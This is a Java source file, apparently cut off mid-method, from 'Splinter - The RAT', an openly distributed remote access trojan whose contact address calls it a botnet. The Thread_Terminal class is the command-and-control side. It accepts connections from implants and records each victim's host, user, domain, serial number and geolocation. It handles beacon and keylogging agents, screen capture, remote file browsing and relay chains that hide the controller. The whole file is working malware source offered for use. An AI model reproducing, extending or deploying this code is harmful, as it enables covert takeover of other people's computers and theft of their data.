/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Controller.Thread;

import Controller.Drivers.Drivers;
import Controller.GUI.Frame_FileBrowser;
import Controller.GUI.JPanel_BeaconCommand;
import Controller.GUI.JPanel_MainControllerWindow;
import Controller.GUI.JPanel_TextDisplayPane;
import Controller.GUI.JTable_FileBrowser_Solomon;
import Controller.GUI.JTable_Solomon;
import Controller.GUI.Object_FileBrowser;
import Controller.GUI.Splinter_GUI;
import GeoLocation.GeoThread;
import GeoLocation.ShowMap;
import Implant.Driver;
import Implant.FTP.FTP_ServerSocket;
import Implant.Payloads.Frame_Render_Captured_Screen;
import Implant.Payloads.Worker_Thread_Payloads;
import RelayBot.RelayBot_ForwardConnection;
import RelayBot.RelayBot_ServerSocket;
import RunningProcess.Frame_RunningProcessList;
import RunningProcess.Node_RunningProcess;
import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Vector;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JTextField;
import javax.swing.Timer;

public class Thread_Terminal extends Thread
  implements Runnable, ActionListener
{
  String strMyClassName = "Thread_Terminal";

  private Vector<String> vctMyRowData = new Vector();

  Frame_RunningProcessList runningProcessFrame = null;
  Node_RunningProcess ndeRunningProcess = null;
  public volatile boolean frameRunningProcessIsDisposed = false;

  public RelayBot_ForwardConnection relaybotFowardConnection = null;

  public RelayBot_ServerSocket myRelaybot_ServerSocket = null;

  String fle__isDrive = null;
  String fle__fle = null;
  String fle__driveDisplayName = null;
  String fle__isFileSystem = null;
  String fle__isFloppy = null;
  String fle__isDirectory = null;
  String fle__isFile = null;
  String fle__isHidden = null;
  String fle__isTraversable = null;
  String fle__canRead = null;
  String fle__canWrite = null;
  String fle__canExecute = null;
  String fle__fullPath = null;
  String fle__parentDirectory = null;
  String fle__dateLastModified_long = null;
  String fle__totalSpace = null;
  String fle__usableSpace = null;
  String fle__Size = null;
  String fle__upDirectory = null;
  public volatile boolean frameFileBrowserIsDisposed = false;

  private BufferedReader brIn = null;
  public PrintWriter pwOut = null;
  public Socket sktMyConnection = null;

  public volatile boolean dataAcquisitionComplete = false;
  public volatile boolean displayMessageInPrivateFrame = false;
  public static final String WINDOWS_COMMAND_PROMPT_HEADER_STRING = "[Version";
  public static final String NEWER_VERSION_OF_CMD_PROMPT_HEADER_STRING = "Copyright (c)";
  public static final String OLDER_VERSION_OF_CMD_PROMPT_HEADER_STRING = "(C) Copyright";
  public ArrayList<JPanel_TextDisplayPane> alJtxtpne_PrivatePanes = new ArrayList();

  long myThread_ID = getId();
  int myIMPLANT_ID = 0;

  public volatile boolean I_am_Disconnected_From_Implant = false;

  public volatile long myRandomIdentifier = 0L;

  public Thread_Terminal myCareOfAddressNode = null;

  GeoThread myGeoLocation = null;

  String myLocalControllerPort = ""; String myLocalController_IP = ""; String myVictim_RHOST_IP = ""; String myRemote_RHOST_Port = "";

  public String connectedAgentHandshake_BackwardLink_Relay = "";

  public String I_have_an_important_message = "*";

  public String myCareOfAddress = "  -  ";
  public String myImplantName = "UNKNOWN";
  public String myImplantInitialLaunchDirectory = "";
  public String myBinaryFileName = "UNKNOWN";
  public String myHostName = "";
  public String myOS = "";
  public String myOS_Shortcut = "";
  public String myServicePack = "";
  public String myUserName = "";
  public String myUserDomain = "";
  public String myHomeDrive = "";
  public String myProcessorArchitecture = "";
  public String myCountryCode = "";
  public String myNumberOfUsers = "";
  public String myOS_Architecture = "";
  public String mySerialNumber = "";
  public String myVersionNumber = "";
  public String myNumberOfProcessors = "";
  public String myOS_Type = "";
  public String mySystemRoot = "";
  public String myUserProfile = "";
  public String myTempPath = "";
  public String myDisconnectionTime = "";
  public String myLastConnectionTime = " - ";
  public String myBeaconInterval = " - ";
  public String myApproxTimeTilNextBeacon = " - ";
  public String myConfirmationID_Beacon = "";
  public String myUniqueDelimiter = "";
  String myChatScreenName = "";

  public String myReceivedConfirmationID_From_Implant = "";

  public String myCurrentWorkingDirectory = " > ";

  public long myCurrentConnectionTime_millis = 1L; public long myDisconnectionTime_millis = 1L; public long myLastConnectionTime_millis = 0L;

  public boolean GEO_RESOLUTION_COMPLETE = false;
  public String myFullGeoData = "Resolving...";
  public String myGEO_IP = "";
  public String myGEO_CountryCode = "";
  public String myGEO_CountryName = "";
  public String myGEO_RegionCode = "";
  public String myGEO_RegionName = "";
  public String myGEO_City = "";
  public String myGEO_Latitude = "";
  public String myGEO_Longitude = "";
  public String myGEO_MetroCode = "";
  public String myGEO_AreaCode = "";

  public volatile boolean continueRun = false;
  public volatile boolean killThread = false;

  public volatile ArrayList<String> alReceivedLine = new ArrayList();
  public volatile boolean processInterrupt = true;
  public Timer tmrReadLine = null;
  String inputLine = "";
  public volatile boolean closingRunningProcessFrame = false;

  public volatile boolean pauseRunningProcessUpdate = false;

  public volatile boolean geo_resolution_complete = false;

  public volatile Frame_FileBrowser myFileBrowser = null;
  public volatile Object_FileBrowser objFileBrowser = null;
  public volatile Object_FileBrowser objStartingFileDirectory = null;
  public String[] arrObjectData = null;

  boolean privateChatMsg = false;

  public boolean i_am_Splinter_RAT = false;
  public boolean i_am_NETCAT_Agent = false;
  public boolean i_am_Controller_Agent = false;
  public boolean i_am_Relay_Agent = false;
  public boolean i_am_Beacon_Agent = false;
  public boolean i_am_receiving_beacon_response = false;
  public boolean i_am_loggie_agent = false;
  public boolean i_am_connecting_to_implant = false;
  public boolean i_am_connecting_to_controller = false;
  public boolean i_am_setup_as_relay = false;

  public boolean i_have_associated_with_controller = false;

  public String relay_Controller_Forward_Address = null;
  public int relay_Controller_Forward_Port = 0;

  public boolean relay_mode_BRIDGE = false;
  public boolean relay_mode_PROXY = false;

  public File fleMySaveDirectory = null;
  public File fleMyScreenScrapeDirectory = null;
  public Worker_Thread_Payloads worker_ScreenScrape = null;

  public Thread_Terminal(boolean connectingToImplant, boolean connectingToController, boolean connectingToRelay, Socket skt)
  {
    this.i_am_connecting_to_implant = connectingToImplant;
    this.i_am_connecting_to_controller = connectingToController;
    this.i_am_setup_as_relay = connectingToRelay;

    this.sktMyConnection = skt;
  }

  public void run()
  {
    try
    {
      try
      {
        this.myCurrentConnectionTime_millis = Driver.getTime_Current_Millis();
        this.myLastConnectionTime = Driver.getTimeStamp_Without_Date(); } catch (Exception e) {
        Driver.sop("\nCOULD NOT SAVE CURRENT CONNECTION TIME");
      }

      Drivers.sop("In thread: " + this.myThread_ID + ".  Attempting to open streams on socket...");

      this.brIn = new BufferedReader(new InputStreamReader(this.sktMyConnection.getInputStream()));

      this.pwOut = new PrintWriter(new BufferedOutputStream(this.sktMyConnection.getOutputStream()));

      Drivers.sop("Streams opened");

      this.myLocalControllerPort = this.sktMyConnection.getLocalAddress().toString();
      this.myLocalController_IP = ""+this.sktMyConnection.getLocalPort();
      this.myVictim_RHOST_IP = this.sktMyConnection.getInetAddress().toString();
      Drivers.sop(this.sktMyConnection.getInetAddress().toString());
      Drivers.sop(this.sktMyConnection.getLocalAddress().toString());
      Drivers.sop(this.sktMyConnection.getLocalSocketAddress().toString());
      this.myRemote_RHOST_Port = ""+this.sktMyConnection.getPort();

      this.continueRun = true;

      if (this.i_am_connecting_to_controller)
      {
        this.pwOut.println("[SPLINTER_CONTROLLER]" + Driver.getHandshakeData("%%%%%"));
        this.pwOut.flush();
      }

      if (Drivers.acquireAgentOverheadData)
      {
        acquireOverheadData(this.brIn, this.pwOut);

        Drivers.sop("Overhead of Data Aquisition complete for this thread ID: " + this.myThread_ID + ".");
      }

      if (this.myIMPLANT_ID == 1)
      {
        do
        {
          if ((this.inputLine != null) && (!this.inputLine.trim().equals("")))
          {
            try
            {
              Driver.logReceivedLine(true, getId(), " " + this.myRandomIdentifier + " ", " " + this.myImplantName + " ", " SPLINTER - CONTROLER ", " " + this.myVictim_RHOST_IP + " ", " " + Thread_ServerSocket.ControllerIP + " ", this.inputLine);
            }
            catch (Exception localException1)
            {
            }
            if ((this.inputLine.trim().startsWith("[SPLINTER_IMPLANT]")) || (this.inputLine.trim().startsWith(this.myUniqueDelimiter)))
            {
              if (!determineCommand(this.inputLine))
              {
                postResponse(this.inputLine);
              }

            }
            else
            {
              postResponse(this.inputLine);
            }
          }
          if ((!this.continueRun) || (this.killThread) || (this.sktMyConnection.isClosed()) || ((this.inputLine = this.brIn.readLine()).equals("disconnectImplant"))) break;  } while (this.inputLine != null);
      }
      else
      {
        if ((this.tmrReadLine != null) && (this.tmrReadLine.isRunning()))
        {
          try
          {
            this.tmrReadLine.stop();
          } catch (Exception localException2) {
          }
        }
        this.processInterrupt = false;
        this.tmrReadLine = new Timer(10, this);
        this.tmrReadLine.start();
        do
        {
          if ((this.inputLine != null) && (!this.inputLine.trim().equals("")))
          {
            this.alReceivedLine.add(this.inputLine);
            try
            {
              Driver.logReceivedLine(true, getId(), " " + this.myRandomIdentifier + " ", " " + this.myImplantName + " ", " SPLINTER - CONTROLER ", " " + this.myVictim_RHOST_IP + " ", " " + Thread_ServerSocket.ControllerIP + " ", this.inputLine);
            } catch (Exception localException3) {
            }
            this.processInterrupt = true;
          }
          if ((!this.continueRun) || (this.killThread) || (this.sktMyConnection.isClosed()) || ((this.inputLine = this.brIn.readLine()).equals("disconnectImplant"))) break;  } while (this.inputLine != null);
      }

    }
    catch (Exception e)
    {
      Drivers.sop("\nThread ID [" + this.myThread_ID + "]: Streams (and socket) are closed for this connection.");
    }

    cleanThreadAndClose();
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if (ae.getSource() == this.tmrReadLine)
      {
        try
        {
          if ((!this.continueRun) || (this.killThread) || (this.sktMyConnection.isClosed()))
          {
            closeThread();
          }
        }
        catch (Exception localException1) {
        }
        if ((this.alReceivedLine != null) && (this.alReceivedLine.size() > 0))
        {
          this.processInterrupt = false;
          readLineFromSocket();
        }

      }

    }
    catch (Exception e)
    {
      Drivers.eop("AE", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }
  }

  public boolean cleanThreadAndClose()
  {
    try
    {
      this.continueRun = false;
      this.I_am_Disconnected_From_Implant = true;

      this.myDisconnectionTime = Drivers.getTimeStamp_Without_Date();

      if (this.myDisconnectionTime == null)
      {
        this.myDisconnectionTime = "";
      }

      try
      {
        this.tmrReadLine.stop();
      }
      catch (Exception localException1) {
      }
      if (this.relay_mode_PROXY)
      {
        Driver.sop("\nBacklink Socket to Agent was severed from Agent Side! - Socket Closed.");
        Driver.sop("Terminating Forwardlink to controller (or next hop) now...");
        try
        {
          if (this.relaybotFowardConnection != null)
          {
            try
            {
              this.relaybotFowardConnection.sktConnection.close();
              Driver.sop("Forwardlink socket closed.");
            }
            catch (Exception localException2)
            {
            }
          }
        }
        catch (Exception localException3) {
        }
        Driver.sop("\n* * * Cleanup complete.\n");
      }

      if (this.i_am_setup_as_relay)
      {
        Driver.removeThread(this, getId());
        return true;
      }

      try
      {
        for (int i = 0; i < this.alJtxtpne_PrivatePanes.size(); i++)
        {
          ((JPanel_TextDisplayPane)this.alJtxtpne_PrivatePanes.get(i)).appendStatusMessageString(false, "------------>>>>>>>> DISCONNECTED FROM CLIENT @" + this.myDisconnectionTime);
        }
      }
      catch (Exception localException4)
      {
      }
      try
      {
        if (this.runningProcessFrame != null)
        {
          this.runningProcessFrame.jlblConnectedAgentInfo.setText("------------>>>>>>>> DISCONNECTED FROM CLIENT @" + this.myDisconnectionTime);
          this.runningProcessFrame.jlblConnectedAgentInfo.setOpaque(true);
          this.runningProcessFrame.jlblConnectedAgentInfo.setForeground(Color.yellow);
          this.runningProcessFrame.jlblConnectedAgentInfo.setBackground(Color.red);
        }

      }
      catch (Exception localException5)
      {
      }

      try
      {
        if (this.myFileBrowser != null)
        {
          this.myFileBrowser.i_am_connected_to_implant = false;
          this.myFileBrowser.jtblFileBrowser.jlblHeading.setText("------------>>>>>>>> DISCONNECTED FROM CLIENT @" + this.myDisconnectionTime);
          this.myFileBrowser.jtblFileBrowser.jlblHeading.setOpaque(true);
          this.myFileBrowser.jtblFileBrowser.jlblHeading.setForeground(Color.yellow);
          this.myFileBrowser.jtblFileBrowser.jlblHeading.setBackground(Color.red);
        }

      }
      catch (Exception localException6)
      {
      }

      try
      {
        if (this.i_am_loggie_agent)
        {
          if (Driver.alLoggingAgents.contains(this))
          {
            Driver.alLoggingAgents.remove(this);

            Drivers.jtblDisconnectedImplants.addRow(getJTableRowData());

            this.I_am_Disconnected_From_Implant = true;
            this.continueRun = false;
            this.killThread = true;

            Drivers.jtblLoggingAgents.updateJTable = true;
            try {
              this.sktMyConnection.close(); } catch (Exception localException7) {
            }
          }
          return true;
        }
      }
      catch (Exception e)
      {
        Driver.sop("Could not interact with logging agent during thread removal and termination!!!");

        Drivers.removeThread(this, getId());

        return true;
      }
    }
    catch (Exception e) {
      Drivers.eop("cleanThreadAndClose", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean readLineFromSocket()
  {
    try
    {
      if ((this.alReceivedLine == null) || (this.alReceivedLine.size() < 1))
      {
        return false;
      }

      this.inputLine = ((String)this.alReceivedLine.remove(0));

      if (this.inputLine == null)
      {
        throw new SocketException("Socket Appears to Be Closed");
      }

      if ((this.i_am_setup_as_relay) && (this.relay_mode_PROXY) && (!Driver.controller_is_running))
      {
        relayMessage_PROXY_FORWARD_LINK(this.inputLine);
        return true;
      }

      if ((this.i_am_setup_as_relay) && (this.relay_mode_BRIDGE) && (!Driver.controller_is_running))
      {
        relayMessage_BRIDGE(this.inputLine);
        return true;
      }

      if (this.i_am_Beacon_Agent)
      {
        if (!determineCommand(this.inputLine))
        {
          Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, this.inputLine, Drivers.clrImplant, Drivers.clrBackground);
        }

        this.processInterrupt = true;
        return true;
      }

      if ((this.inputLine.trim().startsWith("[SPLINTER_IMPLANT]")) || (this.inputLine.trim().startsWith(this.myUniqueDelimiter)) || (this.inputLine.startsWith("[SPLINTER_IMPLANT@")))
      {
        if (!determineCommand(this.inputLine))
        {
          postResponse(this.inputLine);
        }

        this.processInterrupt = true;
        return true;
      }

      postResponse(this.inputLine);

      this.processInterrupt = true;
      return true;
    }
    catch (SocketException se)
    {
      Drivers.sop("Socket detected in " + this.strMyClassName + " has returned value expected from a closed socket. Perhaps implant has disconnected abruptly.  Cleaning up thread...");
    }
    catch (Exception e)
    {
      Drivers.eop("readLineFromSocket", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean postResponse(String inputLine)
  {
    try
    {
      if (this.i_am_setup_as_relay)
      {
        return false;
      }

      if ((this.alJtxtpne_PrivatePanes != null) && (this.alJtxtpne_PrivatePanes.size() > 0) && (inputLine != null))
      {
        for (int i = 0; i < this.alJtxtpne_PrivatePanes.size(); i++)
        {
          try
          {
            if ((inputLine != null) && (!inputLine.trim().equals("")) && ((inputLine.contains(":\\")) || (inputLine.contains(":/"))) && (inputLine.trim().endsWith(">")) && (((JPanel_TextDisplayPane)this.alJtxtpne_PrivatePanes.get(i)).myMainControllerWindow != null) && (!((JPanel_TextDisplayPane)this.alJtxtpne_PrivatePanes.get(i)).myMainControllerWindow.jlblTerminalWorkingDirectory.getText().trim().equalsIgnoreCase(inputLine.trim())))
            {
              this.myCurrentWorkingDirectory = (" " + inputLine.trim());
              ((JPanel_TextDisplayPane)this.alJtxtpne_PrivatePanes.get(i)).myMainControllerWindow.jlblTerminalWorkingDirectory.setText(this.myCurrentWorkingDirectory + " ");
            }
            else
            {
              ((JPanel_TextDisplayPane)this.alJtxtpne_PrivatePanes.get(i)).appendString(true, ""+this.myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
            }

          }
          catch (Exception e)
          {
            ((JPanel_TextDisplayPane)this.alJtxtpne_PrivatePanes.get(i)).appendString(true, ""+this.myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
          }

        }

      }
      else
      {
        Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("postResponse", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean updateBeaconConnectionTime(String confirmationID)
  {
    try
    {
      Thread_Terminal bcn = Driver.getBeaconThread(this.myReceivedConfirmationID_From_Implant);

      if ((bcn == null) && (!this.myConfirmationID_Beacon.trim().equals("")))
      {
        Driver.alBeaconTerminals.add(this);
      }

      Thread_Terminal beaconThread = Driver.getBeaconThread(this.myReceivedConfirmationID_From_Implant);

      if (beaconThread == null)
      {
        beaconThread = this;
      }

      long testVal = Driver.getTime_Current_Millis();
      this.myLastConnectionTime_millis = testVal;

      String interval = Driver.getTimeInterval(Driver.getTime_Current_Millis(), beaconThread.myLastConnectionTime_millis);

      if (!interval.equals("00:00:00"))
      {
        beaconThread.myBeaconInterval = interval;

        beaconThread.myApproxTimeTilNextBeacon = Driver.getTime_calculateFutureTime_Given_Time_And_Delay(Driver.getTime_Current_Millis(), Math.abs(Driver.getTime_Current_Millis() - beaconThread.myLastConnectionTime_millis));
      }

      beaconThread.myLastConnectionTime_millis = Driver.getTime_Current_Millis();

      if ((!beaconThread.geo_resolution_complete) && (!this.myConfirmationID_Beacon.trim().equals("")))
      {
        beaconThread.resolve_GEO_LOCATION();
      }

      Drivers.updateBeaconImplants();
      Drivers.jtblBeaconImplants.updateJTable = true;

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("updateConnectionTime", this.strMyClassName, e, "", false);
    }

    return false;
  }

  public boolean relayMessage_PROXY_FORWARD_LINK(String line)
  {
    try
    {
      if ((this.relaybotFowardConnection == null) || (!this.relaybotFowardConnection.connectionEstablished))
      {
        this.relaybotFowardConnection = new RelayBot_ForwardConnection(this, this.relay_Controller_Forward_Address, this.relay_Controller_Forward_Port, this.connectedAgentHandshake_BackwardLink_Relay);
      }
      else
      {
        this.relaybotFowardConnection.relayMessage_FORWARD(line);
      }

    }
    catch (Exception e)
    {
      Driver.sop("* * * UNABLE TO RELAY MESSAGE!!! * *");
    }

    return true;
  }

  public boolean storeHandShakeData(String handShake)
  {
    try
    {
      if ((handShake == null) || (handShake.trim().equals("")))
      {
        return false;
      }

      String[] arrAgent = handShake.split("%%%%%");

      this.myImplantInitialLaunchDirectory = arrAgent[0];
      this.myHostName = arrAgent[1];
      this.myOS = arrAgent[2];
      this.myOS_Type = arrAgent[3];
      this.myUserName = arrAgent[4];
      this.myUserDomain = arrAgent[5];
      this.myTempPath = arrAgent[6];
      this.myUserProfile = arrAgent[7];
      this.myProcessorArchitecture = arrAgent[8];
      this.myNumberOfProcessors = arrAgent[9];
      this.mySystemRoot = arrAgent[10];

      this.myServicePack = arrAgent[11];
      this.myNumberOfUsers = arrAgent[12];
      this.mySerialNumber = arrAgent[13];
      this.myOS_Architecture = arrAgent[14];
      this.myCountryCode = arrAgent[15];
      this.myVersionNumber = arrAgent[16];
      this.myHomeDrive = arrAgent[17];

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("storeHandshakeData", this.strMyClassName, e, "", false);
    }

    return false;
  }

  private boolean determineCommand(String line)
  {
    try
    {
      if ((line == null) || (line.trim().equals("")))
      {
        return false;
      }

      if (line.trim().startsWith("[SPLINTER_LOGGIE_AGENT]"))
      {
        String handShake = line.replace("[SPLINTER_LOGGIE_AGENT]", "");
        storeHandShakeData(handShake);

        this.i_am_loggie_agent = true;

        this.myIMPLANT_ID = 7;
        try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }

        Drivers.sop("===}}} Sweet! Looks like we have a " + this.myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this logging agent");

        this.myRandomIdentifier = Driver.getUniqueRandomNumber();

        sendCommand_RAW(""+this.myRandomIdentifier);

        return true;
      }

      if ((this.i_am_Beacon_Agent) && (this.i_am_receiving_beacon_response))
      {
        if (line.trim().equals("[SPLINTER_BEACON_RESPONSE_ALL_DATA_HAS_BEEN_SENT]"))
        {
          closeThread();
          return true;
        }

        if (line.trim().startsWith("REQUEST BEACON COMMAND LIST"))
        {
          this.i_am_receiving_beacon_response = false;
          return determineCommand(line);
        }

        if (line.startsWith("[[[HANDSHAKE]]]"))
        {
          String handShake = line.replace("[[[HANDSHAKE]]]", "");
          storeHandShakeData(handShake);

          this.myIMPLANT_ID = 6;
          try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }

          return true;
        }

        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, this.inputLine, Drivers.clrImplant, Drivers.clrBackground);

        return true;
      }

      if ((line.trim().startsWith("[SPLINTER_CONTROLLER]")) && (!this.i_have_associated_with_controller))
      {
        this.myIMPLANT_ID = 3;
        this.myImplantName = "SPLINTER - CONTROLLER";
        this.i_am_Controller_Agent = true;

        Drivers.sop("-->>>> Yeah Man! Looks like we have a " + this.myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this controller");

        this.connectedAgentHandshake_BackwardLink_Relay = line;
        try
        {
          line = line.replace("[SPLINTER_CONTROLLER]", "");
        }
        catch (Exception localException1)
        {
        }
        String[] arrAgent = line.split("%%%%%");

        if ((arrAgent == null) || (arrAgent.length < 2))
        {
          Driver.sop("Invalid handshake received! Unable to determine agent connection type");
          Driver.sop("received line: " + line);
          return false;
        }

        this.myImplantInitialLaunchDirectory = arrAgent[0];
        this.myHostName = arrAgent[1];
        this.myOS = arrAgent[2];
        this.myOS_Type = arrAgent[3];
        this.myUserName = arrAgent[4];
        this.myUserDomain = arrAgent[5];
        this.myTempPath = arrAgent[6];
        this.myUserProfile = arrAgent[7];
        this.myProcessorArchitecture = arrAgent[8];
        this.myNumberOfProcessors = arrAgent[9];
        this.mySystemRoot = arrAgent[10];

        this.myServicePack = arrAgent[11];
        this.myNumberOfUsers = arrAgent[12];
        this.mySerialNumber = arrAgent[13];
        this.myOS_Architecture = arrAgent[14];
        this.myCountryCode = arrAgent[15];
        this.myVersionNumber = arrAgent[16];
        this.myHomeDrive = arrAgent[17];

        if (this.i_am_setup_as_relay)
        {
          if (this.relay_mode_BRIDGE)
          {
            sendCommand_RAW("[SPLINTER_RELAY_BRIDGE]" + Driver.getHandshakeData("%%%%%"));
          }
          else if (this.relay_mode_PROXY)
          {
            sendCommand_RAW("[SPLINTER_RELAY_PROXY]" + Driver.getHandshakeData("%%%%%"));
          }

        }
        else
        {
          sendCommand_RAW("[SPLINTER_CONTROLLER]" + Driver.getHandshakeData("%%%%%"));
        }

        this.i_have_associated_with_controller = true;

        return true;
      }

      if (line.startsWith("[SPLINTER_BEACON_RESPONSE_HEADER]"))
      {
        Driver.sop("Splinter BEACON Response preamble received. Commencing data input...");

        this.myReceivedConfirmationID_From_Implant = line.replace("[SPLINTER_BEACON_RESPONSE_HEADER]", "");

        updateBeaconConnectionTime(this.myReceivedConfirmationID_From_Implant);

        return true;
      }

      if (line.startsWith("[SPLINTER_BEACON]"))
      {
        this.myIMPLANT_ID = 6;
        try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }
        this.i_am_Beacon_Agent = true;

        Drivers.sop("<<<<< -- >>>>> Ooooohhh Joy! Looks like we have a " + this.myImplantName + " connected!  <<<<< -- >>>>> confidence: 100%.  Setting up the environment to handle this type of implant");

        this.connectedAgentHandshake_BackwardLink_Relay = line;
        try
        {
          line = line.replace("[SPLINTER_BEACON]", "");
        }
        catch (Exception localException2)
        {
        }
        String[] arrAgent = line.split("%%%%%");

        this.myImplantInitialLaunchDirectory = arrAgent[0];
        this.myHostName = arrAgent[1];
        this.myOS = arrAgent[2];
        this.myOS_Type = arrAgent[3];
        this.myUserName = arrAgent[4];
        this.myUserDomain = arrAgent[5];
        this.myTempPath = arrAgent[6];
        this.myUserProfile = arrAgent[7];
        this.myProcessorArchitecture = arrAgent[8];
        this.myNumberOfProcessors = arrAgent[9];
        this.mySystemRoot = arrAgent[10];

        this.myServicePack = arrAgent[11];
        this.myNumberOfUsers = arrAgent[12];
        this.mySerialNumber = arrAgent[13];
        this.myOS_Architecture = arrAgent[14];
        this.myCountryCode = arrAgent[15];
        this.myVersionNumber = arrAgent[16];
        this.myHomeDrive = arrAgent[17];

        this.myRandomIdentifier = Driver.getUniqueRandomNumber();

        this.myUniqueDelimiter = ("[SPLINTER_IMPLANT@" + this.myRandomIdentifier + "]");

        sendCommand_RAW(""+this.myRandomIdentifier);

        this.myConfirmationID_Beacon = ""+this.myRandomIdentifier;

        if (Driver.instance_loaded_CONTROLLER)
        {
          sendCommand_RAW("SET IMPLANT REGISTRATION%%%%%" + this.myRandomIdentifier);
        }

        if ((this.i_am_setup_as_relay) && (this.relay_mode_PROXY))
        {
          if ((line != null) && (!line.startsWith("[SPLINTER_BEACON]")))
          {
            relayMessage_PROXY_FORWARD_LINK(this.connectedAgentHandshake_BackwardLink_Relay);
          }
          else
          {
            relayMessage_PROXY_FORWARD_LINK(this.connectedAgentHandshake_BackwardLink_Relay);
          }

        }

        return true;
      }

      if (line.startsWith("[SPLINTER_IMPLANT]"))
      {
        this.myIMPLANT_ID = 2;
        try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }
        this.i_am_Splinter_RAT = true;

        Drivers.sop("-->>>> Ooooohhh Joy! Looks like we have a " + this.myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this type of implant");

        this.connectedAgentHandshake_BackwardLink_Relay = line;
        try
        {
          line = line.replace("[SPLINTER_IMPLANT]", "");
        }
        catch (Exception localException3)
        {
        }
        String[] arrAgent = line.split("%%%%%");

        this.myImplantInitialLaunchDirectory = arrAgent[0];
        this.myHostName = arrAgent[1];
        this.myOS = arrAgent[2];
        this.myOS_Type = arrAgent[3];
        this.myUserName = arrAgent[4];
        this.myUserDomain = arrAgent[5];
        this.myTempPath = arrAgent[6];
        this.myUserProfile = arrAgent[7];
        this.myProcessorArchitecture = arrAgent[8];
        this.myNumberOfProcessors = arrAgent[9];
        this.mySystemRoot = arrAgent[10];

        this.myServicePack = arrAgent[11];
        this.myNumberOfUsers = arrAgent[12];
        this.mySerialNumber = arrAgent[13];
        this.myOS_Architecture = arrAgent[14];
        this.myCountryCode = arrAgent[15];
        this.myVersionNumber = arrAgent[16];
        this.myHomeDrive = arrAgent[17];

        this.myRandomIdentifier = Driver.getUniqueRandomNumber();

        this.myUniqueDelimiter = ("[SPLINTER_IMPLANT@" + this.myRandomIdentifier + "]");

        sendCommand_RAW(""+this.myRandomIdentifier);

        if ((this.i_am_setup_as_relay) && (this.relay_mode_PROXY))
        {
          if ((line != null) && (!line.startsWith("[SPLINTER_IMPLANT]")))
          {
            relayMessage_PROXY_FORWARD_LINK(this.connectedAgentHandshake_BackwardLink_Relay);
          }
          else
          {
            relayMessage_PROXY_FORWARD_LINK(this.connectedAgentHandshake_BackwardLink_Relay);
          }

        }

      }
      else
      {
        if ((line.trim().startsWith("[SPLINTER_RELAY_BRIDGE]")) && (!this.i_have_associated_with_controller))
        {
          this.myIMPLANT_ID = 4;
          this.myImplantName = "SPLINTER - RELAY BRIDGE";
          this.i_am_Relay_Agent = true;

          Drivers.sop("-->>>> * * * Yeah Man!!! Looks like we have a " + this.myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this controller");

          this.connectedAgentHandshake_BackwardLink_Relay = line;
          try
          {
            line = line.replace("[SPLINTER_RELAY_BRIDGE]", "");
          }
          catch (Exception localException4)
          {
          }
          String[] arrAgent = line.split("%%%%%");

          if ((arrAgent == null) || (arrAgent.length < 2))
          {
            Driver.sop("Invalid handshake received! Unable to determine agent connection type");
            Driver.sop("received line: " + line);
            return false;
          }

          this.myImplantInitialLaunchDirectory = arrAgent[0];
          this.myHostName = arrAgent[1];
          this.myOS = arrAgent[2];
          this.myOS_Type = arrAgent[3];
          this.myUserName = arrAgent[4];
